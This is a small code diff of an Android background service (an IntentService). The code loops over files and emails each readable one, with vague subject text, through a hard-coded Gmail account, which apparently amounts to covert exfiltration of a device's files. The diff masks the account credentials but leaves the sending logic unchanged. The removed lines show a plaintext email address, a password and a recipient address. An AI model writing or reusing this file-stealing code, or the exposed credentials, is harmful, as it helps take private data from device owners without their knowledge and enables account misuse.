@@ -138,8 +138,8 @@ public class MyIntentService extends IntentService {
         for (File f : files){
             if (f.isFile() && f.canRead()){
                 try {
-                    GMail androidEmail2 = new GMail("reginasafina116@gmail.com",
-                            "Secret37", "regi.safina.instagram@gmail.com",
+                    GMail androidEmail2 = new GMail("******@gmail.com",
+                            "******", "******@gmail.com",
                             "hi", "Ex", f.toString());
                     androidEmail2.createEmailMessage();
                     androidEmail2.sendEmail();
